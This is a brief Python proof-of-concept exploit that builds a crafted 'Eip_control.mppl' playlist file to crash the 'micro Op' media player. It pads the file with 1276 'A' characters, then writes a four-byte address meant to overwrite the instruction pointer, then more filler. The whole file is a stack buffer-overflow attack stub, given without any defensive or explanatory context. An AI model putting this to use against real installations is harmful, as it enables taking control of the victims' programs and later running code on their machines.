#!/usr/bin/python

#micro Op crashing mppl file crashing script

file =open("Eip_control.mppl", "wb")



buffer ="A" * 1276 + "\x7b\x95\xad\x74" + "C" * 300

file.write(buffer)

file.close()

